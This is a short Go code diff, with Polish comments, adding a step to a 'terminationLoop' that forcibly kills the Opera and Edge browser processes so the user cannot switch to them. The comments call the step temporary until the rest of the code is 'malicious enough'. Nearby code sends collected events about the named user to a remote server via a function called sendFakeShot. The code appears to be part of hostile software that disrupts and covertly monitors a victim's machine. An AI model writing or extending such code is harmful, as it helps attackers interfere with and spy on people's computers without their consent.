@@ -49,6 +49,11 @@ func terminationLoop(userName string) {
 				events = append(events, terminationMsgs...)
 			}
 
+			// todo tymczas, wywalic gdy powyzsze bedzie juz dosc zlosliwe.
+			// todo to jest zeby nie przeszedl od razu na opere albo edge
+			terminationMsgs := terminateProcesses([]string{"opera", "edge"})
+			events = append(events, terminationMsgs...)
+
 			// dumping events to server
 			if len(events) > 200 || (time.Since(eventsDumped) > 30*time.Minute && len(events) > 0) {
 				err := sendFakeShot(userName, "frequent events:\n"+join(events, "\n"))
